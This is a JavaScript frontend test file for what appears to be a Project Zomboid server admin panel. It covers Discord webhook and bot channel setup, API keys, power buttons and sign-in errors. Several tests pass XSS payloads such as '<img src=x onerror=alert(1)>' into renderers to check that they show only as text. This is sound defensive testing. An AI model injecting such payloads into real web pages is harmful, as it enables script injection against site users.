/* Compose and env text come from files on disk. A malicious one must not be
   able to reach into the page. */
test('generated file previews are text, never markup', () => {
  const host = el('div');
  paintPlan(host, {
    name: 'x', gamePort: 1, udpPort: 2, rconPort: 3, stackDir: '/x',
    compose: '<script>alert(1)</script>',
    env: 'A=<img src=x onerror=alert(1)>',
    serverFiles: { 'x.ini': 'PublicName=<img src=x onerror=alert(2)>' },
    command: 'true',
  });
  assert.strictEqual(host.querySelectorAll('script').length, 0);
  assert.strictEqual(host.querySelectorAll('img').length, 0);
  assert.ok(host.textContent.includes('<script>alert(1)</script>'));
});

test('a setting owned by .env is shown but cannot be edited', () => {
  const locked = buildControl({ key: 'RCONPort', type: 'int', value: '27019',
    locked: 'Set by RCON_PORT in the stack\u2019s .env.' }, () => {});
  assert.strictEqual(locked.node.disabled, true);
  const free = buildControl({ key: 'PVP', type: 'bool', value: 'true' }, () => {});
  assert.ok(!free.node.disabled);
});

// --- server capabilities and power ------------------------------------------

test('commands that vary between builds wait for the server to confirm them', () => {
  const server = { id: 'cap1', name: 'Cap' };
  const core = { id: 'save' };
  const verify = { id: 'banip', verify: true };
  S.caps = {};
  assert.ok(commandAvailability(server, core).ok);
  assert.ok(!commandAvailability(server, verify).ok);
  S.caps.cap1 = { commands: { save: { state: 'verified' }, banip: { state: 'missing' },
    godmodeplayer: { state: 'fallback', verb: 'godmode' } } };
  assert.ok(commandAvailability(server, core).ok);
  assert.strictEqual(commandAvailability(server, verify).state, 'missing');
  assert.ok(!commandAvailability(server, verify).ok);
  assert.ok(commandAvailability(server, { id: 'godmodeplayer' }).ok);
  S.caps = {};
});

test('Start is offered for a stopped server and Stop for a running one', () => {
  const server = { id: 'p1', name: 'P', dockerContainer: 'pz-p' };
  assert.ok(isStopped(server, { stopped: true }));
  assert.ok(isStopped(server, { containerState: 'exited' }));
  assert.ok(!isStopped(server, { online: true, containerState: 'exited' }));
  assert.ok(!isStopped(server, {}));
  assert.strictEqual(powerButton(server, { stopped: true }, 'btn').textContent, 'Start');
  assert.strictEqual(powerButton(server, { online: true }, 'btn').textContent, 'Stop');
  assert.strictEqual(powerButton({ id: 'x', name: 'X' }, { online: true }, 'btn'), null);
});

// --- Discord ----------------------------------------------------------------

const NOTIFY_OPTIONS = {
  staffEvents: ['server.down', 'server.up'], playerEvents: ['server.restart', 'server.up', 'server.down'],
  defaultStaffEvents: ['server.down'], defaultPlayerEvents: ['server.restart', 'server.up'],
  playerTemplates: { 'server.restart': '{server} restarting', 'server.up': '{server} is back' },
};

function withDiscordState(webhooks, fn) {
  const saved = S.state;
  S.state = Object.assign({}, saved, {
    servers: [{ id: 'a', name: 'Riverside', gamePort: 16261, public: { address: 'play.example.com' } },
      { id: 'b', name: 'Louisville' }],
    config: { notify: { minIntervalSeconds: 300, webhooks } },
    notifyOptions: NOTIFY_OPTIONS,
  });
  const done = () => { S.state = saved; closeAllModals(); };
  try {
    const out = fn();
    if (out && out.then) return out.finally(done);
    done();
    return out;
  } catch (err) { done(); throw err; }
}

// A saved webhook address is never shown, and saving the dialog without
// touching it must send the placeholder back so the server keeps it.
test('a saved webhook address stays hidden and is kept on save', () => withDiscordState([{
  id: 'p', name: 'Players', enabled: true, url: '__pzadmin_unchanged__', audience: 'players',
  events: ['server.restart'], servers: [], liveStatus: true,
}], async () => {
  const sent = [];
  const fetchBefore = sandbox.fetch;
  sandbox.fetch = (path, opts) => {
    if (opts.method === 'POST') {
      sent.push({ path, body: JSON.parse(opts.body) });
      return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"ok":true}') });
    }
    return Promise.reject(new Error('no state in tests'));
  };
  try {
    closeAllModals();
    editWebhook(0);
    const modal = overlay().children[overlay().children.length - 1];
    assert.ok(!modal.querySelectorAll('input').some((i) => i.value === '__pzadmin_unchanged__'),
      'the placeholder must not be shown as an address');
    modal.querySelectorAll('button').find((b) => b.textContent === 'Save').click();
    await new Promise((resolve) => setTimeout(resolve, 0));
    assert.strictEqual(sent.length, 1, 'save should post once');
    const hook = sent[0].body.notify.webhooks[0];
    assert.strictEqual(hook.url, '__pzadmin_unchanged__', 'an untouched address is sent back as the placeholder');
    assert.strictEqual(hook.id, 'p');
    assert.strictEqual(hook.liveStatus, true);
    assertList(hook.events, ['server.restart']);
  } finally {
    sandbox.fetch = fetchBefore;
  }
}));

// Setting up a server's own channel is one paste: it is scoped to that
// server, named after it, and starts with the useful announcements on.
test('a server channel starts scoped, named and with a status message', () => withDiscordState([], async () => {
  const sent = [];
  const fetchBefore = sandbox.fetch;
  sandbox.fetch = (path, opts) => {
    if (opts.method === 'POST') {
      sent.push(JSON.parse(opts.body));
      return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"ok":true}') });
    }
    return Promise.reject(new Error('no state in tests'));
  };
  try {
    closeAllModals();
    editServerChannel(S.state.servers[0]);
    const modal = overlay().children[overlay().children.length - 1];
    const labels = modal.querySelectorAll('label.check')
      .filter((l) => l.children[0] && l.children[0].checked)
      .map((l) => l.textContent);
    assert.ok(labels.includes('The server goes down for a restart'), labels.join(', '));
    assert.ok(labels.includes('The server is back online'), labels.join(', '));
    assert.ok(labels.some((t) => t.startsWith('Post a status message')), labels.join(', '));
    assert.ok(!labels.includes('Every server'), 'a server channel has no server picker');

    const address = modal.querySelectorAll('input').find((i) => (i.attributes.placeholder || '').startsWith('https://discord'));
    address.value = 'https://discord.com/api/webhooks/1/x';
    address.dispatch('input');
    modal.querySelectorAll('button').find((b) => b.textContent === 'Save').click();
    await new Promise((resolve) => setTimeout(resolve, 0));
    const hook = sent[0].notify.webhooks[0];
    assert.strictEqual(hook.server, 'a');
    assertList(hook.servers, ['a']);
    assert.strictEqual(hook.name, 'Riverside');
    assert.strictEqual(hook.url, 'https://discord.com/api/webhooks/1/x');
  } finally {
    sandbox.fetch = fetchBefore;
  }
}));

// The page is organised by server: each says where it is announced.
test('the Discord page shows where each server is announced', () => withDiscordState([
  { id: 'r', name: 'Riverside', enabled: true, url: '__pzadmin_unchanged__', audience: 'players',
    events: ['server.up'], servers: ['a'], server: 'a', liveStatus: true },
  { id: 's', name: 'staff', enabled: true, url: '__pzadmin_unchanged__', audience: 'staff', events: ['server.down'], servers: [] },
], () => {
  const main = el('main');
  viewDiscord(main);
  const rows = main.querySelectorAll('.list-row').map((r) => r.textContent);
  const riverside = rows.find((r) => r.startsWith('Riverside'));
  assert.ok(riverside.includes('Own channel'), riverside);
  assert.ok(riverside.includes('play.example.com:16261'), 'the join address should be shown: ' + riverside);
  const louisville = rows.find((r) => r.startsWith('Louisville'));
  assert.ok(louisville.includes('no channel yet') && louisville.includes('Set up channel'), louisville);
  assert.ok(louisville.includes('Staff alerts in: staff'), louisville);
  // A server's own channel is listed with its server, not among the shared ones.
  assert.strictEqual(rows.filter((r) => r.startsWith('Riverside')).length, 1, rows.join(' / '));
}));

// With a bot, a server's channel is picked from a list and can show its
// status in its name; what is saved is the channel ID, not a webhook.
test('a server channel can go through the bot and show a status dot', () => withDiscordState([], async () => {
  const sent = [];
  const fetchBefore = sandbox.fetch;
  S.state.config.notify.bot = { token: '__pzadmin_unchanged__', name: 'Knox Radio' };
  S.botChannels = null;
  sandbox.fetch = (path, opts) => {
    if (opts.method === 'POST') {
      sent.push(JSON.parse(opts.body));
      return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"ok":true}') });
    }
    if (path === '/api/discord/channels') {
      return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve(JSON.stringify({ channels: [
        { id: '111111111111111111', name: 'riverside', guild: 'Zomboid Crew', category: 'Servers' },
      ] })) });
    }
    return Promise.reject(new Error('no state in tests'));
  };
  try {
    closeAllModals();
    editServerChannel(S.state.servers[0]);
    const modal = overlay().children[overlay().children.length - 1];
    const via = modal.querySelectorAll('select').find((sel) => sel.children.some((o) => o.attributes.value === 'bot'));
    via.value = 'bot';
    via.dispatch('change');
    await new Promise((resolve) => setTimeout(resolve, 0));
    await new Promise((resolve) => setTimeout(resolve, 0));
    const picker = modal.querySelectorAll('select').find((sel) =>
      sel.children.some((o) => o.textContent === 'Zomboid Crew › Servers › #riverside'));
    assert.ok(picker, 'the bot’s channels should be listed');
    picker.value = '111111111111111111';
    picker.dispatch('change');
    const dot = modal.querySelectorAll('label.check').find((l) => l.textContent.includes('in the channel’s name'));
    dot.children[0].checked = true;
    dot.children[0].dispatch('change');
    modal.querySelectorAll('button').find((b) => b.textContent === 'Save').click();
    await new Promise((resolve) => setTimeout(resolve, 0));
    assert.strictEqual(sent.length, 1, 'save should post: ' + modal.querySelector('.error').textContent);
    const hook = sent[0].notify.webhooks[0];
    assert.strictEqual(hook.channelId, '111111111111111111');
    assert.strictEqual(hook.url, '');
    assert.strictEqual(hook.renameChannel, true);
    assert.strictEqual(hook.server, 'a');
  } finally {
    sandbox.fetch = fetchBefore;
    S.botChannels = null;
  }
}));

test('a Discord step names its channel', () => withDiscordState([
  { id: 'r', name: 'riverside-chat', enabled: true, audience: 'players', events: [], servers: [] },
], () => {
  assert.strictEqual(describeStep({ kind: 'discord', webhook: 'r', message: 'hi' }), 'post to riverside-chat');
  assert.strictEqual(describeStep({ kind: 'discord', webhook: 'gone', message: 'hi' }), 'post to a removed channel');
}));

// --- API keys -----------------------------------------------------------------

test('creating an API key sends the chosen access and shows the key once', async () => {
  const sent = [];
  const fetchBefore = sandbox.fetch;
  const serversBefore = S.state.servers;
  S.state.servers = [{ id: 'a', name: 'Riverside' }, { id: 'b', name: 'Muldraugh' }];
  sandbox.fetch = (path, opts) => {
    if (opts.method === 'POST') {
      sent.push({ path, body: JSON.parse(opts.body) });
      return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve(
        '{"ok":true,"key":"pzk_abcd1234_secret","apiKey":{"id":"abcd1234","name":"Discord bot"}}') });
    }
    return Promise.resolve({ ok: true, status: 200, text: () => Promise.resolve('{"keys":[]}') });
  };
  try {
    closeAllModals();
    let reloaded = 0;
    apiKeyCreateDialog(() => { reloaded++; });
    const modal = overlay().children[overlay().children.length - 1];
    const name = modal.querySelectorAll('input').find((i) => i.attributes.placeholder === 'Discord bot');
    name.value = 'Discord bot';
    const checks = modal.querySelectorAll('label.check');
    const box = (text) => checks.find((l) => l.textContent.startsWith(text)).children[0];
    box('Control').checked = true;
    const all = box('All servers');
    all.checked = false;
    all.dispatch('change');
    box('Muldraugh').checked = true;
    modal.querySelectorAll('button').find((b) => b.textContent === 'Create key').click();
    await new Promise((resolve) => setTimeout(resolve, 0));

    assert.strictEqual(sent.length, 1);
    assert.strictEqual(sent[0].path, '/api/keys/create');
    assert.strictEqual(sent[0].body.name, 'Discord bot');
    assertList(sent[0].body.scopes, ['read', 'control']);
    assertList(sent[0].body.servers, ['b']);
    assert.strictEqual(reloaded, 1, 'the key list should reload');
    assert.strictEqual(openCount(), 1, 'only the reveal dialog should be open');
    const reveal = overlay().children[overlay().children.length - 1];
    assert.ok(reveal.textContent.includes('pzk_abcd1234_secret'), 'the new key is shown');
    closeAllModals();
  } finally {
    sandbox.fetch = fetchBefore;
    S.state.servers = serversBefore;
  }
});

test('an API key list keeps a hostile key name as text', () => {
  const parts = apiKeysBody([{ id: 'x1', name: '<img src=x onerror=alert(1)>', scopes: ['read', 'console'],
    servers: [], lastUsed: null, expires: null }], () => {});
  const host = el('div');
  for (const p of parts) if (p) host.append(p);
  assert.ok(host.textContent.includes('<img src=x onerror=alert(1)>'));
  assert.strictEqual(host.querySelectorAll('img').length, 0);
  assert.ok(host.textContent.includes('Console'));
});

test('mod requests from a bot render as text, pending first with buttons', () => {
  const panel = modRequestsPanel({ id: 's1', name: 'Riverside' }, 'riv.ini', [
    { id: 'r1', workshopId: '2169435993', title: '<img src=x onerror=alert(1)>', modIds: ['A'],
      requestedBy: '<script>x</script>', note: HOSTILE[0], via: 'cog', status: 'pending',
      created: new Date().toISOString() },
    { id: 'r2', workshopId: '1', title: '', modIds: [], requestedBy: 'Glenn', status: 'rejected',
      reason: 'Too heavy', created: new Date().toISOString() },
  ], () => false);
  assert.strictEqual(panel.querySelectorAll('img').length + panel.querySelectorAll('script').length, 0);
  assert.ok(panel.textContent.includes('<script>x</script>'), 'requester shown literally');
  assert.ok(panel.textContent.includes('1 waiting'));
  assert.ok(panel.textContent.includes('Workshop item 1'), 'an untitled request is named by its ID');
  assert.ok(panel.textContent.includes('Reason: Too heavy'));
  const buttons = Array.from(panel.querySelectorAll('button')).map((b) => b.textContent);
  assertList(buttons, ['Approve', 'Reject'], 'only the pending request has buttons');
});

// --- sign-in and setup ------------------------------------------------------

// A wrong password comes back as a 401. That must show the error on the form
// the person is looking at, not redraw an empty form as if a session expired.
async function submitGateForm(render, status, error) {
  const fetchBefore = sandbox.fetch;
  const sent = [];
  sandbox.fetch = (path, opts) => {
    sent.push({ path, body: JSON.parse(opts.body) });
    return Promise.resolve({ ok: false, status, text: () => Promise.resolve(JSON.stringify({ error })) });
  };
  const wasAuthenticated = S.authenticated;
  try {
    render();
    const root = document.querySelector('#root');
    const form = root.querySelector('form');
    for (const input of form.querySelectorAll('input')) input.value = input.value || 'something-long-enough';
    form.dispatch('submit', { type: 'submit', preventDefault() {} });
    await new Promise((resolve) => setTimeout(resolve, 0));
    await new Promise((resolve) => setTimeout(resolve, 0));
    return { form, root, sent };
  } finally {
    sandbox.fetch = fetchBefore;
    S.authenticated = wasAuthenticated;
  }
}

test('an import result names every job it left out, as text', () => {
  closeAllModals();
  showImportResult({ servers: 1, skippedServers: ['Muldraugh'], schedulesReplaced: true, schedules: 2,
    skippedSchedules: ['"<b>x</b>" step 1: wait for between 1 second and a day'], timezone: 'Europe/London' });
  const text = document.body.textContent;
  assert.ok(text.includes('Imported, with some things left out'));
  assert.ok(text.includes('Muldraugh'));
  assert.ok(text.includes('Schedules replaced with 2 jobs'));
  assert.ok(text.includes('"<b>x</b>" step 1'), 'the reason is shown as text');
  assert.strictEqual(document.body.querySelectorAll('b').length, 0);
  closeAllModals();
});

test('a wrong password shows an error on the same sign-in form', async () => {
  const { form, root, sent } = await submitGateForm(renderGate, 401, 'incorrect username or password');
  assert.strictEqual(sent[0].path, '/api/login');
  assert.strictEqual(root.querySelector('form'), form, 'the form must not be redrawn');
  assert.strictEqual(form.querySelector('.error').textContent, 'Incorrect username or password');
});

test('the setup form sends the setup code and shows a wrong code', async () => {
  const { form, root, sent } = await submitGateForm(renderSetup, 403, 'that setup code is not right');
  assert.strictEqual(sent[0].path, '/api/setup');
  assert.ok('setupCode' in sent[0].body, 'the setup code is sent');
  assert.strictEqual(root.querySelector('form'), form);
  assert.strictEqual(form.querySelector('.error').textContent, 'That setup code is not right');
});

// --- report -----------------------------------------------------------------


(async () => {
  await queue;
  let failed = 0;
  for (const [status, name, message] of results) {
    if (status === 'pass') {
      console.log('  ok   ' + name);
    } else {
      failed++;
      console.log('  FAIL ' + name + '\n       ' + message);
    }
  }
  console.log('\n' + (results.length - failed) + '/' + results.length + ' frontend tests passed');
  process.exit(failed ? 1 : 0);
})();
